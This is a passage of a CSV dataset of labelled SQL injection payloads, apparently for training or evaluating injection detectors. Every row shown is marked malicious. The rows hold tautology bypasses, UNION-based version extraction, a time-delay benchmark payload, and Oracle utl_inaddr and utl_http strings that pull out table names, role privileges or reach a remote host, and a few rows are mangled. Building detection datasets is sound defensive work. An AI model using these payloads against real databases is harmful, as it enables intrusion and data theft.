row_index,payload_norm,label,sqli_type_hint
210,"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1,
211,||UTL_HTTP.REQUEST,1,
212,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,
213,"select * from users where id = '1'<@.. union select 1,version ( ) -- 1'",1,
214,""" ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
215,"select * from users where id = 1 <@.$ union select 1,version ( ) -- 1",1,
216,"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1,
217,select * from users where id = '1' <@.$ or 1 = 1 -- 1',1,
218,1 uni on select all from where,1,
219,"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1,
220,"select * from users where id = 1 or 1#""? union select null,version ( ) -- 1",1,
221,admin' ) or '1' = '1'#,1,
222,||utl_http.request ( 'httP://192.168.1.1/' ) ||',1,
223,or '7659' = '7659,1,
224,"select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1,
225,"select * from users where id = 1 union select +!<1,version ( ) -- 1",1,
226,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,
227,"select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1,
228,"select * from users where id = 1 union select !<1,version ( ) -- 1",1,
229,"select * from users where id = '1' union select \#,@@VERSION -- 1'",1,
230,"select * from users where id = 1 or 1#""{ union select 1,version ( ) -- 1",1,
231,""" or true--",1,
232,select * from users where id = 1. or 1 = 1 -- 1,1,
233,"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",1,
234,"select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1,
235,â or 3 = 3 --,1,
236,AND 1 = utl_inaddr.get_host_address ( ( SELECT global_name FROM global_name ) ) AND 'i' = 'i,1,
237,"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1,
238,"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1,
239,"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1,
